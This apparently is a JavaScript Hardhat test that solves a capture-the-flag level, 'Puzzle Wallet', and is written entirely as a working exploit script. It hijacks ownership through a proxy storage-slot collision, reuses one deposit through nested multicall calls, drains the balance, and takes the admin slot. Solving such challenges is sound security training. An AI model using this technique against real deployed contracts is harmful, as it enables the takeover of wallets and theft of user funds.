const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("PuzzleProxy");
  const challengeAddress = await createChallenge(`0x725595BA16E76ED1F6cC1e1b65A88365cC494824`, ethers.parseEther(`0.001`))
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 24-Puzzle", async function () {
  const challenge = await getChallenge();
  const challengeAddress = await challenge.getAddress();

  const [eoa] = await ethers.getSigners();
  const eoaAddress = await eoa.getAddress();
  const interface = (await ethers.getContractFactory("PuzzleWallet")).interface;

  // Using `ethers.provider.call()` or `eoa.send()` are all non-state-changing calls, similar to `staticCall()`
  // For state-changing calls, should use `sendTransaction()` instead.

  // Step 1: Modify slot 0 to modify the `owner` in Wallet contract.
  await challenge.proposeNewAdmin(eoaAddress);

  // Step 2: Add eoa to whitelist.
  await eoa.sendTransaction({
    to: challengeAddress,
    data: interface.encodeFunctionData("addToWhitelist", [eoaAddress])
  });

  // Step 3: Deposit 2 times and withdraw once. Wrap one of the deposits in a multicall to bypass the deposit once check.
  // This is to fulfill the contract balance == 0 check.
  const depositCallData = interface.encodeFunctionData("deposit", []);
  const wrappedDepositCallData = interface.encodeFunctionData("multicall", [[depositCallData]]);
  const executeCallData = interface.encodeFunctionData("execute", [eoaAddress, ethers.parseEther("0.002"), "0x"]);
  const multiCallData = interface.encodeFunctionData("multicall", [[depositCallData, wrappedDepositCallData, executeCallData]]);

  await eoa.sendTransaction({
    to: challengeAddress,
    data: multiCallData,
    value: ethers.parseEther("0.001"),
  });

  // Step 4: Simply set the admin by `setMaxBalance` because they share the same slot 1.
  await eoa.sendTransaction({
    to: challengeAddress,
    data: interface.encodeFunctionData("setMaxBalance", [BigInt(eoaAddress)]),
  });

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
